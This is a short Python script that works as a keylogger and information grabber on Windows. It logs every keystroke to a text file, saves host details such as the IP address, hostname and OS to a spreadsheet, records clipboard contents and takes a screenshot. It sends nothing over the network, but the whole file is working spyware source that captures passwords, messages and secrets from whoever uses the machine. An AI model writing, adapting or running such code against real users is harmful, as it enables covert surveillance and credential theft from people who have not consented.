from pynput.keyboard import Key, Listener  
import datetime 
import socket 
import platform  
import win32clipboard  
from PIL import ImageGrab  
import pandas as pd  


keystrokes = []

def on_press(key):
    keystrokes.append(key)
    write_file(keystrokes)
    print(f"Key pressed: {key}")

def write_file(keys):
    with open("keystrokes_logs.txt", "a") as f:
        for key in keys:
            new_key = str(key).replace("'", "")
            f.write(new_key)
            f.write(" ")
        keystrokes.clear()  

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def get_computer_info():
    date = datetime.date.today()
    ip_address = socket.gethostbyname(socket.gethostname())
    processor = platform.processor()
    system = platform.system()
    release = platform.release()
    host_name = socket.gethostname()

    data = {
        'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
        'Value': [date, ip_address, processor, system, release, host_name]
    }
    df = pd.DataFrame(data)
    df.to_excel('computer_info.xlsx', index=False)
    print("Computer information saved to computer_info.xlsx")

def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except Exception as e:
        pasted_data = f"Clipboard data could not be retrieved: {e}"

    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        f.write(f"\nDate and time: {current_date}\n")
        f.write(f"Clipboard data: \n{pasted_data}\n")
    print("Clipboard information saved to clipboard.txt")


def take_screenshot():
    try:
        im = ImageGrab.grab()
        im.save("screenshot.png")
        print("Screenshot saved to screenshot.png")
    except Exception as e:
        print(f"Error taking screenshot: {e}")

if __name__ == "__main__":
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    get_computer_info()
    copy_clipboard()
    take_screenshot()
    